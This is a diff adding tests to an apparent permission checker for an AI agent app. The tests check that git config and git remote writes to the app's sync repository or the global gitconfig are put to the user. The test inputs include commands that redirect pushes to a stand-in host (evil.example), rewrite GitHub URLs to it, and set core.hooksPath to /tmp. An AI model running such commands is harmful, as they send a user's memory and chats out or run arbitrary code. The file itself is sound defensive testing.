@@ -169,6 +169,34 @@ describe("a shell command that writes a file the app acts on", () => {
     expect(reasonFor("bash", { command: "npm test > /tmp/out.log" })).toBeUndefined();
     expect(reasonFor("bash", { command: "git status" })).toBeUndefined();
   });
+
+  // git writes its config without naming the file: one `git config` in the
+  // sync copy redirected the next sync of the user's memory and chats.
+  it("is put to the user for a git config or git remote write, naming the config file", () => {
+    const syncRepo = join(LAX, "sync-repo");
+    const changes = (command: string): string | undefined => reasonFor("bash", { command });
+    expect(changes(`git -C ${syncRepo} config remote.origin.pushurl https://evil.example/x.git`)).toContain("changes ~/.lax/sync-repo/.git/config");
+    expect(changes(`git -C ${syncRepo} config --add url.https://evil.example/.insteadOf https://github.com/`)).toContain("~/.lax/sync-repo/.git/config");
+    expect(changes(`git -C ${syncRepo} remote set-url --push origin https://evil.example/x.git`)).toContain("~/.lax/sync-repo/.git/config");
+    expect(changes(`git -C ${syncRepo} config set core.hooksPath /tmp/h`)).toContain("~/.lax/sync-repo/.git/config");
+    expect(changes("git config --global core.hooksPath /tmp/h")).toContain("changes ~/.gitconfig, which can run commands every time git runs");
+    expect(changes(`git config --file ${join(LAX, "hooks.json")} a.b c`)).toContain("~/.lax/hooks.json");
+  });
+
+  it("asks nothing of a git config read, or a write to a repository the app does not act on", () => {
+    const syncRepo = join(LAX, "sync-repo");
+    for (const command of [
+      `git -C ${syncRepo} config --get remote.origin.url`,
+      `git -C ${syncRepo} config remote.origin.url`,
+      `git -C ${syncRepo} config --list --show-origin`,
+      `git -C ${syncRepo} config get --all remote.origin.url`,
+      `git -C ${syncRepo} remote -v`,
+      `git -C ${syncRepo} remote get-url --push origin`,
+      "git config --global --get user.email",
+      `git -C ${join(tmpdir(), "my-app")} config user.email me@example.com`,
+      "git config user.email me@example.com",
+    ]) expect(reasonFor("bash", { command }), command).toBeUndefined();
+  });
 });
 
 // so the default there is the user's yes, and only the agent's working data
